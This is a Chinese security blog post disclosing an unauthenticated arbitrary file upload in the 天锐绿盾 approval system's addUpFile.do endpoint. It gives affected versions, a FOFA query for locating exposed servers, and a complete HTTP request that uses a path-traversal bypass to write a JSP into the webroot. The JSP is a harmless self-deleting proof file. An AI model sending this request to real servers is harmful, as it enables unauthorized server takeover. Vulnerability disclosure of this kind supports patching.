---
title: "天锐绿盾审批系统 addUpFile.do 任意文件上传漏洞"
source: https://mrxn.net/jswz/trwfe-addUpFile-upload-rce.html
asset_dir: assets/天锐绿盾审批系统-addupfile.do-任意文件上传漏洞
---

# 天锐绿盾审批系统 addUpFile.do 任意文件上传漏洞

[Mrxn](https://mrxn.net/author/1)* 发表于2025/11/14 08:30
* 596浏览
* [0评论](#comment)
* 10分钟阅读

深入探索

服务器安全服务

安全研究报告

企业安全咨询


(adsbygoogle = window.adsbygoogle || []).push({});

---

# 漏洞简介

天锐绿盾审批系统是一款专注于企业数据安全与合规管理的智能审批平台，深度融合了文档加密、权限管控与流程自动化等功能，旨在为企业提供从文件创建、流转到归档的全生命周期安全管控。

漏洞修复方案

该系统的 `addUpFile.do` 接口存在任意[文件上传](https://mrxn.net/tag/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0)漏洞。 未经身份验证的攻击者可以利用此漏洞，通过向 `addUpFile.do` 接口上传恶意文件，例如[Webshell](https://mrxn.net/tag/rce)，从而获取服务器的控制权限。

此漏洞可能导致攻击者完全控制目标服务器，进而造成企业敏感数据泄露、系统被篡改或进一步的网络攻击等严重安全风险。

# 影响版本

> 可通过访问 /trwfe/exports/config.ini 获取版本信息

V3.53.240913

V7.05.240904

# fofa语法

> app="TIPPAY-绿盾审批系统"
>
> 安全运维咨询

# 漏洞分析

先看`addUpFile.do`的实现

[![天锐绿盾审批系统 addUpFile.do 任意文件上传漏洞](images/img-001-ac0536ebf06a.webp)](https://image.mrxn.net/335243b085b94222ba5cfeed12758c21.webp)

上传的文件被带入`fileService.addFile` 方法，跟进`fileService.addFile`方法看下它的实现

深入探索

编码转换工具

网络安全会议

安全运维咨询

[![天锐绿盾审批系统 addUpFile.do 任意文件上传漏洞](images/img-002-5f6d937ef9ce.webp)](https://image.mrxn.net/d0f802cf33ea469585a064830d6b453a.webp)

全程对上传文件以及`relativepath`没有任何有效校验或者处理，直接保存，响应 `{"success":true}`，代表上传成功，因此造成任意[文件上传](https://mrxn.net/tag/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0)漏洞。

# 漏洞复现

```
POST /trwfe/login.jsp/.%2e/file/addUpFile.do HTTP/1.1
Host: trwfe.mrxn.net
Content-Type: multipart/form-data; boundary=----123

------123
Content-Disposition: form-data; name="relativepath";

../../webapps/trwfe/t
------123
Content-Disposition: form-data; name="file"; filename="1.jsp"

<%out.println(java.util.UUID.randomUUID().toString());new java.io.File(application.getRealPath(request.getServletPath())).delete();%>
------123--
```

访问上传文件trwfe/1.jsp

漏洞修复方案

[![天锐绿盾审批系统 addUpFile.do 任意文件上传漏洞](images/img-003-47d557b463fc.webp)](https://image.mrxn.net/d4f51d46e5624054b4d1ba76fdaedf91.webp)

[成功执行](https://mrxn.net/tag/rce)打印随机uuid后，删除自身

* 标签：
* [#漏洞](https://mrxn.net/tag/%E6%BC%8F%E6%B4%9E)
* [#web安全](https://mrxn.net/tag/web%E5%AE%89%E5%85%A8)
* [#代码审计](https://mrxn.net/tag/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1)
* [#Java](https://mrxn.net/tag/Java)
* [#rce](https://mrxn.net/tag/rce)
* [#文件上传](https://mrxn.net/tag/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0)

---


// 获取当前脚本所在的父容器
const parentContainer = document.currentScript.parentElement;
let searchContainer = parentContainer.querySelector('article') || parentContainer;
if (searchContainer) {
// 优先在 class 名为 prose 或 markdown 的容器内搜索 img 图片
let images = [];
const containers = searchContainer.querySelectorAll('.prose, .markdown');
containers.forEach(function(container) {
images = images.concat(Array.from(container.querySelectorAll('img')));
});
if (images.length === 0) {
images = searchContainer.querySelectorAll('img');
}
images.forEach(function(img) {
if (img.getAttribute('data-action') === 'zoom') {
const parentLink = img.parentNode;
if (parentLink.tagName === 'A') {
parentLink.setAttribute('data-fancybox', 'gallery');
}
} else {
const link = document.createElement('a');
link.setAttribute('data-fancybox', 'gallery');
link.setAttribute('href', img.getAttribute('src'));
img.parentNode.insertBefore(link, img);
link.appendChild(img);
}
});
// 初始化 Fancybox
Fancybox.bind("[data-fancybox]", {
// 您的自定义选项
});
}

文章目录
×

* [1.漏洞简介](#toc-1-)
* [2.影响版本](#toc-2-)
* [3.fofa语法](#toc-3-)
* [4.漏洞分析](#toc-4-)
* [5.漏洞复现](#toc-5-)



.x\_nav\_toc {
position: fixed;
top: 0;
right: -300px;
width: 280px;
height: 100%;
background-color: white;
box-shadow: -2px 0 15px rgba(0, 0, 0, 0.1);
z-index: 1000;
transition: right 0.3s ease;
display: flex;
flex-direction: column;
overflow: hidden;
padding-top: 10px;
}
.x\_nav\_toc.active {
right: 0;
}
.x\_toc\_header {
display: flex;
justify-content: space-between;
align-items: center;
padding: 15px 20px;
height: 48px;
border-bottom: 1px solid #eee;
}
.x\_toc\_title {
font-size: 18px;
font-weight: bold;
color: #333;
}
.x\_toc\_close {
background: none;
border: none;
font-size: 24px;
cursor: pointer;
color: #777;
transition: color 0.2s;
}
.x\_toc\_close:hover {
color: #333;
}
.x\_toc\_content {
flex: 1;
overflow-y: auto;
padding: 15px 20px;
padding-right: 10px;
}
.x\_anchor-list {
list-style-type: none;
padding: 0;
margin: 0;
}
/\* 减小目录项间距 \*/
.x\_anchor-list li {
margin-bottom: 4px; /\* 间距从8px减小到4px \*/
}
.x\_anchor-list a {
text-decoration: none;
color: #555;
display: block;
padding: 6px 10px; /\* 减少内边距 \*/
transition: all 0.2s;
font-size: 14px;
border-radius: 4px;
line-height: 1.4; /\* 减小行高 \*/
}
.x\_anchor-list a:hover,
.x\_anchor-list a:focus {
background-color: #f8f9fa;
color: #0068d6;
}
.toc-number {
font-weight: 600;
margin-right: 8px;
color: #495057;
display: inline-block;
min-width: 25px;
}
/\* 减小各级标题间距 \*/
.toc-h1 {
font-weight: 600;
font-size: 15px;
margin-top: 10px; /\* 上边距从15px减小到10px \*/
padding-left: 5px !important;
}
.toc-h2 {
font-size: 14px;
padding-left: 15px !important; /\* 缩进从20px减小到15px \*/
}
.toc-h3 {
font-size: 13px;
padding-left: 25px !important; /\* 缩进从30px减小到25px \*/
}
.toc-h4 {
font-size: 12px;
padding-left: 35px !important; /\* 缩进从40px减小到35px \*/
}
/\* 修改后的切换按钮样式 - 使用图标且位置下移 \*/
.x\_toc\_toggle {
position: fixed;
bottom:120px; right: 17px;width:40px;height:40px;background-color:white;
border-radius: 50%;
border: none;
cursor: pointer;
box-shadow: 0 4px 12px rgba(0,0,0,0.15);
z-index: 999;
transition: all 0.3s ease;
display: flex;
align-items: center;
justify-content: center;
padding: 0;
}
.x\_toc\_toggle svg {
width:24px;height:24px;stroke:#3d9bff;
}
.x\_toc\_toggle:hover {
#background-color: #0081f8;
transform: translateY(-3px);
box-shadow: 0 6px 15px rgba(0,0,0,0.2);
}
@media (max-width: 768px) {
.x\_nav\_toc {
width: 280px;
}
.x\_toc\_toggle {
bottom: 100px; /\* 手机端也下移位置 \*/
right: 30px;
width: 40px;
height: 40px;
}
.x\_toc\_toggle svg {
width: 20px;
height: 20px;
}
}

document.addEventListener('DOMContentLoaded', function() {
// 获取所有标题元素
var className = ".line-numbers";
var selectors = [];
for (var i = 1; i <= 6; i++) {
selectors.push(className + ' h' + i);
}
var headings = document.querySelectorAll(selectors.join(', '));
// 获取DOM元素
var tocContainer = document.querySelector('.x\_nav\_toc');
var toggleButton = document.querySelector('.x\_toc\_toggle');
var tocList = document.querySelector('.x\_anchor-list');
var closeButton = document.querySelector('.x\_toc\_close');
var currentHighlight = null;
// 检测是否为移动设备
const isMobile = /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent);
// 如果没有标题，隐藏所有元素
if (headings.length === 0) {
tocContainer.style.display = 'none';
toggleButton.style.display = 'none';
return;
}
// 初始化层级计数器
var counters = [0, 0, 0, 0, 0, 0]; // h1-h6
var currentLevel = 0;
// 生成带数字编号的目录
headings.forEach(function(heading, index) {
var level = parseInt(heading.tagName[1]);
// 更新计数器
counters[level - 1] += 1; // 增加当前级别计数器
// 重置更低级计数器
for (var i = level; i < 6; i++) {
counters[i] = 0;
}
// 生成编号字符串（如"1.2.3"）
var numberParts = [];
for (var i = 0; i < level; i++) {
if (counters[i] > 0) {
numberParts.push(counters[i]);
}
}
var numberText = numberParts.join('.')+'.';
// 创建唯一ID
var id = 'toc-' + numberText.replace(/\./g, '-');
heading.id = id;
var listItem = document.createElement('li');
var anchor = document.createElement('a');
var numberSpan = document.createElement('span');
numberSpan.className = 'toc-number';
numberSpan.textContent = numberText;
anchor.appendChild(numberSpan);
anchor.innerHTML += heading.textContent;
anchor.href = '#' + id;
anchor.classList.add('toc-h' + level);
listItem.appendChild(anchor);
tocList.appendChild(listItem);
// 添加点击事件（不关闭目录）
anchor.addEventListener('click', function(e) {
e.preventDefault();
// 更新高亮状态
if (currentHighlight) {
currentHighlight.classList.remove('active');
}
this.classList.add('active');
currentHighlight = this;
// 滚动到对应位置
var targetId = this.getAttribute('href').substring(1);
var targetElement = document.getElementById(targetId);
if (targetElement) {
var header = document.querySelector("header");
var headerHeight = header ? header.offsetHeight : 0;
var elementPosition = targetElement.getBoundingClientRect().top + window.pageYOffset;
var offsetPosition = elementPosition - headerHeight - 20;
window.scrollTo({
top: offsetPosition,
behavior: 'smooth'
});
// 滚动到目录项的可视区域
this.scrollIntoView({behavior: 'smooth', block: 'nearest'});
// 点击事件中
if (isMobile) {
closeToc(); // 移动端点击后关闭目录
}
}
});
});
// 切换按钮点击事件
toggleButton.addEventListener('click', function() {
tocContainer.classList.add('active');
});
// 关闭按钮点击事件
closeButton.addEventListener('click', function(e) {
e.stopPropagation();
closeToc();
});
// 滚动时更新高亮状态
window.addEventListener('scroll', function() {
var fromTop = window.scrollY;
var header = document.querySelector("header");
var headerHeight = header ? header.getBoundingClientRect().height : 0; // 更精确的header高度
//console.log(headerHeight);
// 精准计算标题文档位置
var activeSection = null;
headings.forEach(function(heading) {
var section = document.getElementById(heading.id);
if (!section) return;
// 使用getBoundingClientRect获取精确位置
var rect = section.getBoundingClientRect();
var sectionTop = rect.top + fromTop; // 转换为文档顶部绝对位置
var sectionBottom = rect.bottom + fromTop + headerHeight;
// 增加20px激活区域缓冲
if (fromTop + headerHeight + 20 >= sectionTop && fromTop < sectionBottom) {
activeSection = heading;
}
});
// 更新高亮状态（新增精确边界判断）
if (activeSection) {
var tocLink = tocList.querySelector('a[href="#' + activeSection.id + '"]');
if (tocLink && currentHighlight !== tocLink) {
if (currentHighlight) {
currentHighlight.blur();
currentHighlight.classList.remove('active');
}
tocLink.classList.add('active');
tocLink.focus();
currentHighlight = tocLink;
// 平滑滚动到可视区域（改进触发条件）
var tocRect = tocLink.getBoundingClientRect();
var tocContainerRect = tocContainer.getBoundingClientRect();
if (tocRect.bottom > tocContainerRect.bottom || tocRect.top < tocContainerRect.top) {
tocLink.scrollIntoView({behavior: 'auto', block: 'nearest'});
}
}
}
});
// 关闭目录面板
function closeToc() {
tocContainer.classList.remove('active');
}
});

/\* 超小屏幕隐藏 \*/
@media (max-width: 768px) {
#qrcode-right {
display: none;
}
}

版权所有：[Mrxn's Blog](https://mrxn.net/)  
文章标题：[天锐绿盾审批系统 addUpFile.do 任意文件上传漏洞](https://mrxn.net/jswz/trwfe-addUpFile-upload-rce.html)  
文章链接：<https://mrxn.net/jswz/trwfe-addUpFile-upload-rce.html>  
本站文章均为原创，未经授权请勿用于任何商业用途。仅供安全研究和学习使用。若因传播、利用本文档信息而产生任何直接或间接的后果或损害，均由使用者自行承担，文章作者不为此承担任何责任。

安全运维咨询

![](data:image/png;base64,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)

设备上扫码阅读


var qrcode = new QRCode(document.getElementById("copyright-qrcode"), {
text: encodeURI("https://mrxn.net/jswz/trwfe-addUpFile-upload-rce.html"),
width: 100,
height: 100,
colorDark: "#000000",
colorLight: "#ffffff",
correctLevel: QRCode.CorrectLevel.H
});

  

### 📚 推荐阅读

* [深信服运维安全管理系统 install\_patch 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-system-concentration_management-install_patch-rce.html)
* [深信服运维安全管理系统 del\_patch 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-system-concentration_management-del_patch-rce.html)
* [深信服运维安全管理系统 upload\_file 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-cssp-app-upload_file-rce.html)
* [深信服运维安全管理系统 csspost/update 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-csspost-update-rce.html)
* [深信服运维安全管理系统 save\_SNMP 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-SNMP-save_SNMP-rce.html)
* [深信服运维安全管理系统 getLdap 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-getLdap-rce.html)
* [深信服运维安全管理系统 Jwt 密钥硬编码](https://mrxn.net/jswz/sangfor_osm-login-search_login-token-leak.html)
* [深信服运维安全管理系统 del\_route 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-netConfig-del_route-rce.html)
* [深信服运维安全管理系统 del\_net 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-netConfig-del_net-rce.html)
* [深信服运维安全管理系统 change\_net 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-netConfig-change_net-rce.html)
* [大蚂蚁 (BigAnt) 即时通讯系统 updateLoginName SQL注入漏洞](https://mrxn.net/jswz/bigant-user-updateLoginName-sqli.html)
* [九佳易管理系统 PrivilegedCodeDestroy.asmx SQL注入漏洞](https://mrxn.net/jswz/a8erp-Interface-licx-PrivilegedCodeDestroy-sqli.html)
* [九佳易管理系统 Ajax\_XT.ashx SQL 注入漏洞](https://mrxn.net/jswz/a8erp-Ajax_XT-sqli.html)
* [大蚂蚁 (BigAnt) 即时通讯系统 moveDept SQL注入漏洞](https://mrxn.net/jswz/bigant-dept-moveDept-sqli.html)
* [青龙面板最新版v2.20.1 鉴权绕过致RCE漏洞](https://mrxn.net/jswz/qinglong-auth-bypass-rce.html)
* [九佳易管理系统 picHY.ashx SQL 注入漏洞](https://mrxn.net/jswz/a8erp-HuiYuanDangAn-picHY-sqli.html)
* [大蚂蚁 (BigAnt) 即时通讯系统 安装程序二次注入致远程代码执行漏洞](https://mrxn.net/jswz/bigant-install-config-rce.html)
* [东胜物流软件 MsChDuiController 多个SQL注入漏洞](https://mrxn.net/jswz/dongsheng-MsChDuiController-sqli.html)
* [大蚂蚁 (BigAnt) 即时通讯系统 PublicController 任意文件读取漏洞](https://mrxn.net/jswz/bigant-Public-download.html)
* [东胜物流软件 MsAnnounceController SQL注入漏洞](https://mrxn.net/jswz/dongsheng-MsAnnounce-GetData-sqli.html)

  

/\* 底部展示样式 \*/
.qrcode-bottom-box {
margin: 40px auto;
text-align: center;
}
.qrcode-title {
font-size: 16px;
color: #666;
margin-bottom: 0px;
font-weight: bold;
text-align: center;
}
.qrcode-bottom-box img {
display: inline-block;
padding: 10px;
background: #fff;
border-radius: 8px;
margin: 10px auto;
}
/\* 悬浮展示样式 \*/
.qrcode-float {
position: fixed;
z-index: 9999;
background: rgba(255,255,255,0.98);
padding: 20px;
border-radius: 12px;
}
.qrcode-float:hover {
transform: scale(1.05);
}
/\* 移动端适配 \*/
@media (max-width: 1440px) {
.qrcode-float {
right: 2%;
transform: none;
}
}
/\* 超小屏幕隐藏 \*/
@media (max-width: 768px) {
.qrcode-float {
display: none;
}
}

![](data:image/png;base64,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)

手机扫码阅读


var qrcode = new QRCode(document.getElementById("posts-qrcode"), {
text: encodeURI("https://mrxn.net/jswz/trwfe-addUpFile-upload-rce.html"),
width: 100,
height: 100,
colorDark: "#000000",
colorLight: "#ffffff",
correctLevel: QRCode.CorrectLevel.H
});
 